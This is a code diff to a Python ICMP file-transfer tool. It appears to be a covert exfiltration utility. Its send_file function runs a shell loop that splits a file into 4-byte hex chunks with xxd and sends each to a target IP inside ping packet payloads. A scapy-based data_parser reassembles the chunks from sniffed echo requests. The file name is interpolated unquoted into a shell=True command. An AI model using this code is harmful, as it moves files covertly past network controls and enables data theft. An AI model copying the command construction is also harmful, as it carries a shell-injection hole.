@@ -34,9 +34,11 @@ def get_colours(text, color):
 
 
 def menu_panel():
-    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + "-i <Adaptor name / IP Address> -m <Mode> -f <Filename>", "green")
-    get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――", 'red')
-    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-i]'}{Fore.YELLOW + ' Network Adaptor name'}")
+    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[
+        0] + " -i <Adaptor name / IP Address> -m <Mode> -f <Filename>", "green")
+    get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――",
+                'red')
+    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-i]'}{Fore.YELLOW + ' Network Adaptor name / IP Address'}")
     print("")
     print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-m]'}{Fore.YELLOW + ' Mode to use'}")
     print("")
@@ -52,7 +54,7 @@ def menu_panel():
 def data_parser(packet_info):
     if packet_info.haslayer(ICMP):
         if packet_info[ICMP].type == 8:
-            byte_data = packet_info['ICMP'].load[-4:].decode('utf-8', errors="backslashreplace")
+            byte_data = packet_info['ICMP'].load[-4:].decode('utf-8', errors="ignore")
             print(byte_data, flush=True, end='')
             a = open(f'{sys.argv[6]}.txt', 'a')
             a.write(byte_data)
@@ -60,25 +62,28 @@ def data_parser(packet_info):
 
 
 def send_file(ip_address, file_name):
-    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; done >/dev/null 2>&1"""
-    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
-          f"{Fore.BLUE + '  Trying to send file..'}")
-    check_output = subprocess.run([file_load], shell=True, capture_output=True, text=True)
-    if 'No such file or directory' in str(check_output):
+    try:
+        open(file_name, 'rb').readlines()
+    except FileNotFoundError:
         print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
               f"{Fore.RED + ' Indicate file dosent exist, check file name.'}")
         print(Fore.WHITE)  # To avoid leaving the terminal with colours.
-    else:
-        get_file_length = 0
-        with open(f"{sys.argv[6]}", "r") as f:
-            get_file_length = len(f.readlines())
+        exit()
+    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; sleep .01s; done >/dev/null 2>&1 &"""
+    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+          f"{Fore.BLUE + '  Trying to send file..'}")
+    subprocess.run([file_load], shell=True)
+    with open(f"{sys.argv[6]}", "r") as f:
+        get_file_length = len(f.readlines())
+        calc_progress_bar = get_file_length / 3
         progess_bar = 0
         print()
-        for i in tqdm(range(get_file_length * 10000)):
+        for i in tqdm(range(int(calc_progress_bar))):
+            time.sleep(.1)
             progess_bar += i
-        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
-              f"{Fore.BLUE + '  File sent successfully'}")
-        print(Fore.WHITE)
+    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+          f"{Fore.BLUE + '  File sent successfully'}")
+    print(Fore.WHITE)
 
 
 def check_permisson():
